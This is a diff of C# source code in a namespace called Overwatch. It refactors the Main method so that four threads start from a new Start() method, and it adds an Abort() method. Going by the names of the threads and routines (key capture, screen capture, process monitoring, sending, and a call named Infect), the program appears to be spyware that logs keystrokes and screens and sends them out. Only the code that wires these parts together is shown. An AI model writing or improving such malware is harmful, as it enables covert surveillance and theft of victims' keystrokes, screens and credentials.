@@ -15,6 +15,20 @@ namespace Overwatch
         static Thread SendingTread = new Thread(s.Sending);
         static Thread ProcessTread = new Thread(info.Overview); 
         
+        public static void Start()
+        {
+            KeyTread.Start();
+            ScreenTread.Start();
+            ProcessTread.Start();
+            SendingTread.Start();
+        }
+
+        public static void Abort()
+        {
+            KeyTread.Abort();
+            ScreenTread.Abort();
+            ProcessTread.Abort();
+        }
         static void Main(string[] args)
         {
             try
@@ -22,10 +36,7 @@ namespace Overwatch
 
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
-                KeyTread.Start();
-                ScreenTread.Start();
-                ProcessTread.Start();
-                SendingTread.Start();
+                Start();
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
